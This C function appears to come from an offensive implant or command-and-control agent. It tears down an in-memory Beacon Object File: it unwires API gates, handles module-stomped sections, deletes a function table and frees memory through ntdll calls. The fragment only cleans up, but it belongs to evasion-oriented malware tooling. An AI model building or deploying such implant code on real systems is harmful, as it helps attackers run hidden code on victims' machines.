FUNC VOID NaxBofFreeResident( PNAX_INSTANCE Nax ) {
    if ( !Nax->ResidentNumSections )
        return;

    NaxDbg( Nax, "[bof-resident] freeing" );

    NaxGateUnwireAll( Nax );

    /* Route cleanup to SmSlot if the resident was stomped there */
    Nax->BofStompPool.SmStompReq = TRUE;

    if ( Nax->ResidentPdata && !Nax->ResidentPdataInDll )
        Nax->Ntdll.RtlDeleteFunctionTable( Nax->ResidentPdata );

    NaxBofCleanupSections( Nax, Nax->ResidentSections,
                           Nax->ResidentNumSections, Nax->ResidentStomped );

    if ( Nax->ResidentMapFunc ) {
        SIZE_T z = 0; PVOID b = Nax->ResidentMapFunc;
        Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &z, MEM_RELEASE );
    }

    Nax->BofStompPool.SmStompReq = FALSE;

    MmZero( Nax->ResidentSections, sizeof( Nax->ResidentSections ) );
    Nax->ResidentNumSections = 0;
    Nax->ResidentMapFunc     = NULL;
    Nax->ResidentStomped     = FALSE;
    Nax->ResidentPdata       = NULL;
    Nax->ResidentPdataCount  = 0;
    Nax->ResidentPdataInDll  = FALSE;
}
